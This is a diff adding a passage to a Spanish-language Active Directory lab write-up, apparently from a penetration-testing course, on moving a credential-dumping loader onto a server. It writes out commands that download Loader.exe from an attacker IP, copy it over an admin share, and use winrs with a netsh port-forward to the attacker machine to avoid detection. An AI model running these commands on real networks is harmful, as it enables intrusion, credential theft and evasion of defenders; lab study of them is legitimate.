@@ -95,3 +95,18 @@ viendo que hay una sesion de Domain Asmin en el servidor *dcorp-mgmt* del cual n
 Ahora tenemos que extraer las credenciales de el, para ello tenemos que usar *SafetyKatz* pero primero tenemos que copiar *Loader* en *dcorp-mgmt*
 
 Primero lo descargamos en *dcorp-ci*
+```shell
+iwr http://172.16.100.97/Loader.exe -OutFile C:\Users\Public\Loader.exe
+```
+
+Una vez lo tenemos aqui lo teransferiremos a *dcorp-mgmt*
+```shell
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+```
+
+Ahora volveremos a poder usar *winrs* para poder ejecutarlo en el equipo de *dcorp-mgmt*, en este caso para poder evitar la deteccion en el dominio haremos un reenvio de puertos a t
+```shell
+$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.67"
+```
+
+Haciendo que la maquina objetivo escuche en el puerto *8080* y reenvie el trafico al *80* de nuestra maquina atacante
